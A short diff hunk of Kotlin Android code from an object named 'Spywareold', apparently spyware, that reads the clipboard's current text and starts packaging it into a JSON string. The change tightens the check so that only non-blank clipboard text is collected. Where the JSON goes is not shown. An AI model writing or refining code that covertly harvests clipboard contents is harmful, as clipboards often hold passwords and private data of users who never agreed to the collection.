@@ -43,7 +43,7 @@ object Spywareold {
             val clip = clipboard.primaryClip
             val text = clip?.getItemAt(0)?.text?.toString()
 
-            if (text != null) {
+            if (!text.isNullOrBlank()) {
 
                 val json = """
                 {
